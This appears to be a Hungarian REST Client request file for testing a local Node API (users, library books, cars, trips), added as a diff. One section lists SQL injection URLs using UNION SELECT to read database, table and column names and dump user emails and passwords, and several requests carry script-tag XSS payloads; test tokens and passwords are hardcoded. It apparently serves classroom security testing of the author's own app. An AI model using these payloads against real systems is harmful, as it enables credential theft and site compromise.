@@ -1,0 +1,216 @@
+### login
+post http://localhost:4000/login
+Content-Type: application/json
+
+{
+    "userName": "feri",
+    "password": "jozsi123"
+}
+
+### token kérés
+post http://localhost:4000/token
+Content-Type: application/json
+
+{
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZmVyaSIsImlhdCI6MTY3Njc1Nzg5N30.HcxLe7gKFag5Tjk8lwN-4eOo3CAGBazffU8xKLTTSW8"
+}
+
+### logout
+delete http://localhost:4000/logout
+Content-Type: application/json
+
+{
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZmVyaSIsImlhdCI6MTY3Njc1NTI0M30.aS6yK0l548OjCU3irhz95vTLN2TuA9i4NFJsgXPBXqg"
+}
+
+### logout all
+delete http://localhost:4000/logoutall
+Content-Type: application/json
+
+
+### Userek
+get http://localhost:3000/users
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZmVyaSIsImlhdCI6MTY3Njc1NDcwOCwiZXhwIjoxNjc2NzU1NjA4fQ.KYhG-su5z7jQJJzq9MYJr2J3lBnnPw6oZIjWRT4X6cs
+
+### Egy user
+get http://localhost:3000/users/15
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NDMxNTE5NCwiZXhwIjoxNjQ0MzE4Nzk0fQ.q2ih8UiVs51Pa3UEc908O6tLt5Upl9NOlidEmQSksMQ
+
+### User hozzáadása (regisztráció)
+post http://localhost:3000/users
+Content-Type: application/json
+
+{
+    "firstName": "József",
+    "lastName": "Nagy",
+    "gender": "férfi",
+    "userName": "jozsef",
+    "email": "natgy.jozsef@gmail.com",
+    "password": "123",
+    "number": 33333333
+}
+
+### User módosítása
+put http://localhost:3000/users/14
+Content-Type: application/json
+
+{
+    "firstName": "Géza",
+    "lastName": "Balog",
+    "gender": "férfi",
+    "userName": "geza",
+    "email": "balog.geza@gmail.com",
+    "password": "test123",
+    "number": 123456
+}
+
+### Delete user
+delete http://localhost:3000/users/17
+### #endregion users
+
+### ---------------------------------------
+### get opus
+get http://localhost:3000/opus
+
+### get opus with Specimen (nosql)
+get http://localhost:3000/opusWithSpecimen
+
+### get opusSpecimen (inner join)
+get http://localhost:3000/opusSpecimen
+
+### get opus by id (csak a opus tábla)
+get http://localhost:3000/opus/6
+
+### get opus by id (csak a specimen tábla)
+get http://localhost:3000/opusWithSpecimen/6
+
+### get opus és specimen innerjoin
+get http://localhost:3000/opusSpecimen/2
+
+
+
+### sql injections
+### get adabázis
+get http://localhost:3000/opus/1  UNION SELECT database(), '', '', ''
+
+### get táblák nevei
+get http://localhost:3000/opus/2  union select table_name, '','', '' from information_schema.tables where table_schema='opus'
+
+### users tábla oszlopai
+get http://localhost:3000/opus/1 union select column_name, '', '', data_type from information_schema.columns where table_name='users' and table_schema='cars'
+
+
+### get user adatok
+get http://localhost:3000/opus/1 union select email, password, '','' from users
+
+### delte opus by id
+delete http://localhost:3000/opus/2
+
+### post opus
+post http://localhost:3000/opus
+Content-Type: application/json
+
+{
+    "writer": "Mercedes, Móra",
+    "title": "Egy Mű",
+    "year": 10
+}
+
+### post car XSS teszt
+post http://localhost:3000/cars
+Content-Type: application/json
+
+{
+    "name": "X Mercedes <script>alert('betörtem')</script>",
+    "licenceNumber": "MM-111 <script>alert('betörtem')</script>",
+    "hourlyRate": "2500  <script>alert('betörtem')</script>"
+}
+
+### put opus by id
+put http://localhost:3000/opus/101
+Content-Type: application/json
+
+{
+    "name": "Mercedes3",
+    "licenceNumber": "MM-222",
+    "hourlyRate": 2600,
+    "outOfTraffic": false,
+    "driverId": null
+}
+
+### put opus by id XSS teszt
+put http://localhost:3000/cars/11
+Content-Type: application/json
+
+{
+    "name": "XY Mercedes <script>alert('betörtem')</script>",
+    "licenceNumber": "YM-111 <script>alert('betörtem')</script>",
+    "hourlyRate": "2600  <script>alert('betörtem')</script>"
+}
+
+### get trips by carId
+get http://localhost:3000/tripsByCarId/2
+
+### get trips by id
+get http://localhost:3000/trips/2984
+
+### get trips
+get http://localhost:3000/trips
+
+### post trip
+post http://localhost:3000/trips
+Content-Type: application/json
+
+{
+    "numberOfMinits": 56,
+    "date": "2023-04-03T06:27",
+    "carId": 2
+}
+
+### get trips by id
+delete http://localhost:3000/trips/3585
+
+
+### put trip by id
+put http://localhost:3000/trips/2984
+Content-Type: application/json
+
+{
+    "numberOfMinits": 55,
+    "date": "2022.10.13 01:35:00",
+    "carId": 2
+}
+
+
+### get specimenOpusId
+get http://localhost:3000/specimenOpusId
+
+### get driversAbc
+get http://localhost:3000/driversAbc
+
+### get SpecimenOpusJoin
+get http://localhost:3000/SpecimenOpusJoin
+
+### get Loaning
+get http://localhost:3000/Loaning
+
+### get Loaning with Students
+get http://localhost:3000/LoaningWithStudent
+
+### get Student
+get http://localhost:3000/Students
+
+### get Specimen
+get http://localhost:3000/Specimen
+
+### get minden tabla
+get http://localhost:3000/JoinEverything
+
+### get OpusFirstOffset
+get http://localhost:3000/OpusFirstOffset
+
+### get OpusSecondOffset
+get http://localhost:3000/OpusSecondOffset
+
+### get OpusThirdOffset
+get http://localhost:3000/OpusThirdOffset
